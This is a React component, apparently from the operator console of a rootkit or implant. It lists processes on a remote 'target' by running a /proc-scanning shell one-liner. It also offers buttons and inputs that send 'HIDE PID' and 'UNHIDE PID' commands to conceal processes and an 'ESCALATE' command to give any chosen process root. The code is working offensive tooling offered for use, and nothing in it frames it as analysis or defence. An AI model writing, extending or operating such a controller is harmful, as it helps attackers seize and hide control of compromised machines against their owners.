import { useState, useCallback } from 'react'
import { Activity, Eye, EyeOff, Loader, Zap, Radio } from 'lucide-react'
import { Th } from '../../components/Th'
import { useSnapshot, SnapshotBar, EmptySnapshotCta, HiddenSummary } from '../Target'

const PS_CMD = "for d in /proc/[0-9]*; do u=$(stat -c %u \"$d\" 2>/dev/null); cat \"$d/stat\" 2>/dev/null | sed \"s/^/$u /\"; done"

export function ProcsTab({ target: t, cmd, query, execCmd, busy }) {
  const snap = useSnapshot(`procs:${t.id}`)
  const [filter, setFilter] = useState('')
  const [panel, setPanel] = useState('scan')
  const [escPid, setEscPid] = useState('')
  const [escStatus, setEscStatus] = useState(null)
  const hiddenPids = t.hidden?.pid || []

  const capture = useCallback(() => {
    snap.setLoading(true)
    execCmd(PS_CMD, t.id).then(r => {
      if (r.ok) {
        const parsed = r.output.split('\n').filter(Boolean).map(line => {
          const m = line.match(/^(\d+)\s+(\d+)\s+\((.+?)\)\s+(\S+)\s+(\d+)/)
          if (!m) return null
          return { uid: m[1], pid: m[2], comm: m[3], stat: m[4], ppid: m[5] }
        }).filter(Boolean)
        snap.set(parsed)
      } else {
        snap.fail(r.output || 'failed')
      }
    })
  }, [execCmd, t.id, snap])

  const doEscalate = useCallback((pid) => {
    setEscStatus('pending')
    query(`ESCALATE ${pid}`, t.id).then(r => {
      setEscStatus(r.ok ? 'ok' : 'error')
      if (r.ok) setEscPid('')
      setTimeout(() => { setEscStatus(null); capture() }, 1500)
    })
  }, [query, t.id, capture])

  const procs = snap.data || []
  const filtered = filter
    ? procs.filter(p => p.comm.includes(filter) || p.pid === filter || p.ppid === filter || p.uid === filter)
    : procs

  if (!snap.time && !snap.loading)
    return <EmptySnapshotCta icon={Activity} title="Processes"
      subtitle="Scan /proc for running processes on the target"
      onCapture={capture} online={t.online && !busy} loading={snap.loading} />

  return (
    <div className="flex flex-col h-full">
      <SnapshotBar title="Processes" icon={Activity} count={procs.length} hiddenCount={hiddenPids.length}
        time={snap.time} loading={snap.loading} onSnapshot={capture} online={t.online && !busy}>
        <input className="nb-input px-3 py-1 text-sm w-40 ml-2" placeholder="filter..."
          value={filter} onChange={e => setFilter(e.target.value)} />
        <div className="flex border-2 border-border rounded-[var(--radius)] overflow-hidden shrink-0 ml-2">
          <button
            className={`px-3 py-1 text-sm font-bold ${panel === 'scan' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('scan')}
          >Scan</button>
          <button
            className={`px-3 py-1 text-sm font-bold border-l-2 border-border ${panel === 'hidden' ? 'bg-main text-main-fg' : 'hover:bg-bg'}`}
            onClick={() => setPanel('hidden')}
          >Hidden {hiddenPids.length}</button>
        </div>
      </SnapshotBar>
      {panel === 'scan' ? (
        <>
          {snap.error && (
            <div className="p-6 text-center">
              <div className="text-red font-bold mb-1">Scan failed</div>
              <div className="text-sm text-fg-3">{snap.error.includes('ticket') || snap.error.includes('busy')
                ? 'Close the active shell session first, then retry.'
                : snap.error}</div>
            </div>
          )}
          {!snap.error && !filtered.length && !snap.loading ? (
            <div className="flex-1 flex items-center justify-center text-fg-3 text-sm">
              {procs.length ? 'No matches' : 'No processes found'}
            </div>
          ) : !snap.error && filtered.length > 0 && (
          <div className="flex-1 overflow-auto">
            <table className="w-full text-sm">
              <thead className="sticky top-0 bg-secondary border-b-2 border-border">
                <tr><Th>PID</Th><Th>User</Th><Th>PPID</Th><Th>State</Th><Th>Command</Th><Th></Th></tr>
              </thead>
              <tbody>
                {filtered.map(p => {
                  const isHidden = hiddenPids.includes(p.pid)
                  const isRoot = p.uid === '0'
                  return (
                    <tr key={p.pid} className={`border-b border-border hover:bg-bg-2 group ${isHidden ? 'opacity-40' : ''}`}>
                      <td className="px-4 py-2 font-mono">{p.pid}</td>
                      <td className={`px-4 py-2 font-mono ${isRoot ? 'text-red font-bold' : 'text-fg-3'}`}>{isRoot ? 'root' : p.uid}</td>
                      <td className="px-4 py-2 font-mono text-fg-3">{p.ppid}</td>
                      <td className="px-4 py-2 font-mono">{p.stat}</td>
                      <td className="px-4 py-2 font-mono">{p.comm}</td>
                      <td className="px-4 py-2 text-right flex items-center justify-end gap-1">
                        <button
                          className="p-1 text-fg-3 hover:text-amber opacity-0 group-hover:opacity-100 transition-opacity"
                          title="Escalate to root"
                          onClick={(e) => { e.stopPropagation(); doEscalate(p.pid) }}
                          disabled={!t.online || isRoot || busy}
                        >
                          <Zap size={14} />
                        </button>
                        <button
                          className={`p-1 transition-opacity ${isHidden ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                          title={isHidden ? 'Unhide PID' : 'Hide PID'}
                          onClick={() => {
                            if (isHidden) {
                              const idx = hiddenPids.indexOf(p.pid)
                              if (idx >= 0) cmd(`UNHIDE PID ${idx}`)
                            } else {
                              cmd(`HIDE PID ${p.pid}`)
                            }
                          }}
                        >
                          {isHidden ? <Eye size={14} /> : <EyeOff size={14} />}
                        </button>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
          )}
          <div className="flex items-center gap-2 px-4 py-2.5 border-t-2 border-border bg-bg-2">
            <Zap size={14} className="text-amber shrink-0" />
            <span className="text-sm font-bold uppercase tracking-wide text-fg-3">Escalate</span>
            <input className="nb-input px-3 py-1.5 text-sm w-32 font-mono" placeholder="PID"
              value={escPid} onChange={e => setEscPid(e.target.value.replace(/\D/g, ''))}
              onKeyDown={e => e.key === 'Enter' && escPid && doEscalate(escPid)} />
            <button className="nb-btn px-3 py-1.5 text-sm font-bold" disabled={!escPid || !t.online || escStatus === 'pending' || busy}
              onClick={() => doEscalate(escPid)}>
              {escStatus === 'pending' ? 'Escalating...' : 'Root'}
            </button>
            {escStatus === 'ok' && <span className="text-xs font-bold text-green">Escalated</span>}
            {escStatus === 'error' && <span className="text-xs font-bold text-red">Failed</span>}
          </div>
        </>
      ) : (
        <div className="flex-1 overflow-auto">
          <HiddenSummary title="Hidden PIDs" icon={Activity} items={hiddenPids}
            onRemove={i => cmd(`UNHIDE PID ${i}`)} onAdd={v => cmd(`HIDE PID ${v}`)} placeholder="1234" />
        </div>
      )}
    </div>
  )
}
